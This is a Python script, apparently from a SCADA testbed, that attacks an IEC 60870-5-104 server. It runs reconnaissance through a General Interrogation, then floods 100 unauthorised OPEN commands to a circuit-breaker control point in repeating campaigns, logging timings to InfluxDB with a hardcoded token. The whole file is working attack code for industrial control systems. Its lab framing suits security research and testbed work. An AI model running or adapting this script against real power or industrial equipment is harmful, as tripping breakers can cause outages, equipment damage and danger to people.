import socket
import time

import c104
from influxdb_client import InfluxDBClient, Point
from influxdb_client.client.write_api import SYNCHRONOUS

INFLUX_URL = "http://influxdb:8086"
INFLUX_TOKEN = "scada-token-123"
INFLUX_ORG = "scada-lab"
INFLUX_BUCKET = "scada-metrics"

_influx = InfluxDBClient(url=INFLUX_URL, token=INFLUX_TOKEN, org=INFLUX_ORG)
_write_api = _influx.write_api(write_options=SYNCHRONOUS)


def push_metric(action, field_name, value):
	try:
		point = (
			Point("iec104")
			.tag("container", "iec104-attacker")
			.tag("action", action)
			.field(field_name, float(value))
		)
		_write_api.write(bucket=INFLUX_BUCKET, record=point)
	except Exception as e:
		print(f"InfluxDB write error: {e}")


def run_iec104_attacker():
	ip = socket.gethostbyname("iec104-server")
	client = c104.Client()
	connection = client.add_connection(ip=ip, port=2404, init=c104.Init.ALL)
	station = connection.add_station(common_address=1)

	# Monitoring points used during reconnaissance via GI.
	station.add_point(io_address=10, type=c104.Type.M_SP_NA_1)
	station.add_point(io_address=20, type=c104.Type.M_ME_NC_1)
	station.add_point(io_address=30, type=c104.Type.M_ME_NC_1)

	breaker_cmd = station.add_point(io_address=100, type=c104.Type.C_SC_NA_1)

	client.start()

	retries = 0
	while connection.state != c104.ConnectionState.OPEN:
		print(f"[Attacker] Waiting for IEC104 server at {connection.ip}:{connection.port} ...")
		time.sleep(3)
		retries += 1
		if retries > 20:
			print("[Attacker] Connection timeout. Exiting.")
			return

	print(f"[Attacker] Connected to IEC104 server at {connection.ip}:{connection.port}")

	while True:
		print("\n--- START ATTACK CAMPAIGN ---")

		# Phase 1: Reconnaissance by triggering a General Interrogation.
		print("[PHASE 1] Reconnaissance: trigger General Interrogation...")
		recon_start = time.time()
		try:
			gi_ok = connection.interrogation(
				common_address=1,
				cause=c104.Cot.ACTIVATION,
				qualifier=c104.Qoi.STATION,
			)
			recon_latency = (time.time() - recon_start)
			if gi_ok:
				print(f" [+] Recon completed in {recon_latency:.2f}s")
				push_metric("attack_recon", "recon_latency", recon_latency)
				push_metric("attack_recon", "gi_ok", 1)
			else:
				print(f" [!] Recon failed in {recon_latency:.2f}s")
				push_metric("attack_recon", "recon_latency", recon_latency)
				push_metric("attack_recon", "gi_ok", 0)
		except Exception as e:
			print(f" Recon exception: {e}")

		time.sleep(2)

		# Phase 2: Unauthorized command flood (OPEN breaker) 100 times.
		print("\n[PHASE 2] Flood attack: send OPEN command (C_SC_NA_1, IOA 100) 100 times...")
		success_count = 0

		for i in range(100):
			try:
				start_time = time.time()
				breaker_cmd.value = False  # OPEN breaker
				ok = breaker_cmd.transmit(cause=c104.Cot.ACTIVATION)
				latency = (time.time() - start_time)

				push_metric("attack_write_flood", "latency", latency)
				push_metric("attack_write_flood", "open_cmd_value", 0)

				if ok:
					success_count += 1
				else:
					print(f" Write failed at attempt {i + 1}")

				time.sleep(0.05)
			except Exception as e:
				print(f" Write error at attempt {i + 1}: {e}")

		print(f" [+] Phase 2 complete. Successful OPEN commands: {success_count}/100")
		print("--- END ATTACK CAMPAIGN. WAIT 30 SECONDS ---\n")
		time.sleep(30)


if __name__ == "__main__":
	run_iec104_attacker()

